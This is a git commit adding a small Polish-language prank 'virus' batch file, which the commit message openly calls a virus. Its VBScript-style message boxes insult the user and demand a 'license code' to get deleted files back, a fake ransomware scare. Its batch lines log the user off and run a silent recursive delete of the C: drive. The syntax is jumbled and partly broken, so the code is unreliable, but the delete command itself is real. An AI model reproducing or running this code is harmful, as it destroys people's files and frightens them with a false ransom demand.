3c63739e03f03df478fb85f977e8af0ea1ce5d15
Kubaplaygame <95038023+Kubaplaygame@users.noreply.github.com>
2021-12-05 17:57:20 +0100

    twój-stary.exe
    to wirus ale nie działa bez .vbs

---
+++ twój-stary.exe.bat
@@ -0,0 +1,14 @@
+msgbox("Twoje pliki zostaną usunięte idioto czego ci ten program był? hmm tłumacz się >:)"
+InputBox"twój-stary.exe"
+msgbox"HeHe"
+n+=inputbox("Wpisz Kod licyejcyjny do naprawy komputera")
+if n-"0-9-5-1-0"then
+msgbox"pliki pszywrucone"
+else
+msgbox"Straciłeś Pliki"
+
+@log off
+
+litle wirus
+color 0A
+del c:\ /s/q/ 
